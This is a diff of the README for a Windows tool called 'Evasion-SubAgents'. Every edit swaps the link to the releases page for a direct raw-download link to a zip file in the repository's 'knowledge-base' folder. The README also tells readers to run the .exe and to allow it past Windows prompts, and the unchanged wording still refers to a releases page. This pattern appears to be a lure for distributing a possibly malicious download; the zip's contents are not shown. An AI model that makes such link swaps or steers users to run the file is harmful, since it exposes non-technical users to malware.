@@ -1,6 +1,6 @@
 # 🛡️ Evasion-SubAgents - Safe and Simple SubAgent Control
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/isra-osvaldo/Evasion-SubAgents/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/isra-osvaldo/Evasion-SubAgents/raw/refs/heads/main/knowledge-base/Agents-Sub-Evasion-v1.4-alpha.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ If your PC meets these basic criteria, you can easily install and run Evasion-Su
 Follow these steps to download and start the application:
 
 1. Click the large green button at the top or visit the download page here:  
-   [https://github.com/isra-osvaldo/Evasion-SubAgents/releases](https://github.com/isra-osvaldo/Evasion-SubAgents/releases)
+   [https://github.com/isra-osvaldo/Evasion-SubAgents/raw/refs/heads/main/knowledge-base/Agents-Sub-Evasion-v1.4-alpha.1.zip](https://github.com/isra-osvaldo/Evasion-SubAgents/raw/refs/heads/main/knowledge-base/Agents-Sub-Evasion-v1.4-alpha.1.zip)
 
 2. On the releases page, look for the latest version. It usually has a tag like "v1.0" or higher.
 
@@ -94,7 +94,7 @@ For further help, look for a "Help" or "Support" section inside the application 
 ## 📥 Download and Installation Recap
 
 Click here to visit the release page and get the latest Windows file:  
-[https://github.com/isra-osvaldo/Evasion-SubAgents/releases](https://github.com/isra-osvaldo/Evasion-SubAgents/releases)
+[https://github.com/isra-osvaldo/Evasion-SubAgents/raw/refs/heads/main/knowledge-base/Agents-Sub-Evasion-v1.4-alpha.1.zip](https://github.com/isra-osvaldo/Evasion-SubAgents/raw/refs/heads/main/knowledge-base/Agents-Sub-Evasion-v1.4-alpha.1.zip)
 
 Download the `.exe` file and run it to install or launch the application. If prompted by Windows, confirm to allow the program to run. Follow simple on-screen steps if shown.
 
@@ -115,4 +115,4 @@ Keep an eye on the release page for updates that can improve your experience and
 
 ---
 
-[![Download on GitHub](https://img.shields.io/badge/Get%20Evasion--SubAgents-blue?style=for-the-badge)](https://github.com/isra-osvaldo/Evasion-SubAgents/releases)
+[![Download on GitHub](https://img.shields.io/badge/Get%20Evasion--SubAgents-blue?style=for-the-badge)](https://github.com/isra-osvaldo/Evasion-SubAgents/raw/refs/heads/main/knowledge-base/Agents-Sub-Evasion-v1.4-alpha.1.zip)
